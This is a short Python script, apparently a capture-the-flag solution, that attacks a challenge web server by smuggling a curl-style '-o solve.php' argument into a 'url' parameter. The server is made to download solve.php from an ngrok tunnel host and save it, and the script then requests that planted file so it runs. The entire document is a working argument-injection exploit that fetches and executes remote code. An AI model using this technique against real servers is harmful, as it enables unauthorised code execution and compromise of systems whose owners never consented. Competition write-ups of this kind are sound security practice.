import requests

payload = "http://0.tcp.ngrok.io:14139/solve.php -o solve.php"
requests.get(
	"http://chal.competitivecyber.club:8090/challenge.php%3Findex.php",
	params={"country": "Norway", "url": payload},
)

print(requests.get("http://chal.competitivecyber.club:8090/solve.php").text)
